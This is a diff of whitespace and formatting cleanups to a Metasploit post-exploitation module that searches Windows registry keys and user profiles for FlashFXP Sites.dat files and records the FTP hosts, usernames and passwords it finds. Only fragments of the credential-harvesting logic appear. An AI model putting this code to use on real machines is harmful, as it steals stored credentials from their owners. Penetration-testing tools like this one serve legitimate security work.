@@ -13,6 +13,7 @@ require 'rex/parser/ini'
 require 'msf/core/post/windows/user_profiles'
 
 class Metasploit3 < Msf::Post
+
 	include Msf::Post::Windows::Registry
 	include Msf::Auxiliary::Report
 	include Msf::Post::Windows::UserProfiles
@@ -31,14 +32,14 @@ class Metasploit3 < Msf::Post
 		))
 	end
 
-	def run		
+	def run
 		#Checks if the Site data is stored in a generic location  for all users
 		flash_reg = "HKLM\\SOFTWARE\\FlashFXP"
 		flash_reg_ver = registry_enumkeys("#{flash_reg}")
 
 		#Ini paths
 		@fxppaths = []
-		
+
 		unless flash_reg_ver.nil?
 				software_key = "#{flash_reg}\\#{flash_reg_ver.join}"
 				generic_path = registry_getvaldata(software_key, "InstallerDataPath") || ""
@@ -46,7 +47,7 @@ class Metasploit3 < Msf::Post
 				@fxppaths << generic_path + "\\Sites.dat"
 			end
 		end
-		
+
 		grab_user_profiles().each do |user|
 			next if user['AppData'] == nil
 			tmpath= user['AppData'] + '\\FlashFXP\\'
@@ -57,8 +58,6 @@ class Metasploit3 < Msf::Post
 			get_ini(fxp)
 		end
 	end
-
-	
 
 	def get_ver_dirs(path)
 		begin
@@ -95,8 +94,7 @@ class Metasploit3 < Msf::Post
 					:port => port,
 					:sname => 'FTP',
 					:user => username,
-					:pass => passwd
-				)
+					:pass => passwd)
 			end
 		rescue
 			print_status("Either could not find or could not open file #{filename}")
